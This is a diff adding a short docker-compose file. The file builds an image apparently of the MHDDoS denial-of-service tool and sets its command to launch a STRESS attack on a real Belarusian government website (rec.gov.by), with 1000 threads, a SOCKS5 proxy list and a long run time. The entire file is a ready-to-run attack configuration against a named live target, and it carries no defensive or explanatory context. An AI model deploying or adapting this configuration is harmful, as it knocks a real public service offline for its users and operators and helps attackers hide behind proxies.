@@ -1,0 +1,11 @@
+version: '3.6'
+
+services:
+  app:
+    build:
+      context: .
+      target: 'mhddos'
+    image: mhddos:latest
+    # restart: always
+    # environment:
+    command: "python3 start.py STRESS https://rec.gov.by/ru 5 1000 socks5.txt 100 1000"
